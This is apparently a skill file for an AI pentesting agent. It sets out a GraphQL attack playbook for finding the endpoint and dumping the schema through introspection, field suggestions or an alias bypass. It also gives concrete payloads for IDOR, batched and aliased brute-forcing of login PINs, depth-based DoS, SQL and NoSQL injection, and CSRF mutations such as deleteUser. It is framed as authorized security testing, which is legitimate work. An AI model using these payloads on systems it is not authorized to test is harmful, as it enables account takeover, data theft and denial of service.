---
name: graphql
description: GraphQL pentest playbook — find the endpoint, dump the schema (introspection or field-suggestion fallback), then test for authorization gaps, query batching, alias overload, depth-based DoS, and SQLi/NoSQLi in resolver arguments. Use when the target exposes a /graphql endpoint, GraphiQL, Apollo, or accepts GraphQL queries.
allowed-tools:
  - http
  - shell
  - read_payloads
  - file_write
---

# GraphQL playbook

Execution rule: resolve the real GraphQL endpoint first, then run concrete `http`/curl requests against it. Never write literal placeholders such as `<other-id>` to files; ask once if required IDs or sessions are missing.

Standard endpoints to probe first (use `http` with `GET` / `POST`):
`/graphql`, `/graphiql`, `/api/graphql`, `/v1/graphql`, `/v2/graphql`, `/query`, `/api/query`.

## 1. Confirm it's GraphQL

POST a tiny query — every implementation answers this:

```json
{"query":"{__typename}"}
```

A reply containing `{"data":{"__typename":"Query"}}` confirms the endpoint. Note the response shape: `{ "data": ..., "errors": [...] }`.

## 2. Schema discovery

### 2a. Introspection (the easy path)

```json
{"query":"query IntrospectionQuery { __schema { queryType { name } mutationType { name } subscriptionType { name } types { ...FullType } } } fragment FullType on __Type { kind name description fields(includeDeprecated: true) { name description args { ...InputValue } type { ...TypeRef } isDeprecated deprecationReason } inputFields { ...InputValue } interfaces { ...TypeRef } enumValues(includeDeprecated: true) { name } possibleTypes { ...TypeRef } } fragment InputValue on __InputValue { name description type { ...TypeRef } defaultValue } fragment TypeRef on __Type { kind name ofType { kind name ofType { kind name ofType { kind name ofType { kind name ofType { kind name ofType { kind name ofType { kind name } } } } } } } }"}
```

Save the response — every later attack starts from this schema. Use `file_write` to keep it next to the engagement notes.

### 2b. Introspection disabled? Use field suggestions

Apollo and most other servers leak field names through error messages:

```json
{"query":"{ user { secrt } }"}
```

Reply often contains `Did you mean "secret"?`. Iterate to enumerate the schema field-by-field. Read `read_payloads(skill="graphql", file="field-suggestion-probes.txt")` for a starter list.

### 2c. Aliased introspection bypass

Some WAFs / middleware block the `__schema` keyword. Bypass with an alias:

```json
{"query":"query { my_alias: __schema { types { name } } }"}
```

Or use `__type(name: "User")` instead of `__schema` to dump types one at a time.

### 2d. Mutation / subscription via GET

Some servers enforce auth only on POST. Try the same query as a GET:

```
GET /graphql?query={__schema{types{name}}}
```

## 3. Authorization gaps

GraphQL queries hit many resolvers; auth checks often live on outer fields only. Look for inner resolvers (`user.email`, `order.shippingAddress`) that fetch without scoping to the caller.

Test patterns:
- Same field through different roots: `me { email }` vs `user(id: <other-id>) { email }`.
- Nested traversal: `order(id: X) { user { email phone } }` — does it leak fields you can't access directly?
- IDOR via mutation: `updateProfile(input: { userId: <other-id>, ... })`.

## 4. Query batching

Some servers accept a JSON *array* as the request body, processing each query independently. Use this to:
- Bypass per-request rate limits.
- Brute-force a 2FA code or password reset token in a single HTTP request:

```json
[{"query":"mutation{login(user:\"x\",pin:\"0001\"){token}}"},{"query":"mutation{login(user:\"x\",pin:\"0002\"){token}}"},{"query":"mutation{login(user:\"x\",pin:\"0003\"){token}}"}]
```

## 5. Alias overload — same endpoint, many resolves per request

```json
{"query":"{ a1: secret a2: secret a3: secret a4: secret ... a1000: secret }"}
```

If the server doesn't cap aliases, you get N × the resolver cost in one request. Use to:
- Brute-force credentials at line speed (each alias is a fresh `login(...)`).
- Trigger DoS via expensive resolvers.

## 6. Depth attacks

Recursive queries through cyclic types:

```graphql
{ user { friends { friends { friends { friends { id } } } } } }
```

If the server has no `depthLimit`, you get exponential expansion. Confirm DoS only against authorized lab targets.

## 7. SQLi / NoSQLi / SSRF in resolver args

Resolvers often pass arguments straight into a query. Try:

```json
{"query":"query($id:String!){ user(id:$id){name} }","variables":{"id":"1' OR '1'='1"}}
```

```json
{"query":"{ user(id: \"{$ne: null}\") { name } }"}
```

For SSRF, look for fields that fetch URLs server-side (`image(url: ...)`, `webhook(url: ...)` — chain into the [[ssrf]] skill).

## 8. CSRF on POST

If the endpoint accepts `application/x-www-form-urlencoded` or doesn't check Origin/CSRF token, GraphQL mutations are CSRF-able. Try:

```
POST /graphql
Content-Type: application/x-www-form-urlencoded

query=mutation{deleteUser(id:1)}
```

## Reporting

When confirming, always include:
- Schema dump (or partial enumerated via 2b) as evidence of the discovery method.
- The exact JSON payload + the HTTP request as a `curl` one-liner.
- Concrete impact (which fields leak, whose data, what mutation succeeded).

If the only finding is "introspection enabled," that alone is **info** unless the schema reveals private fields. Don't file P5 noise.
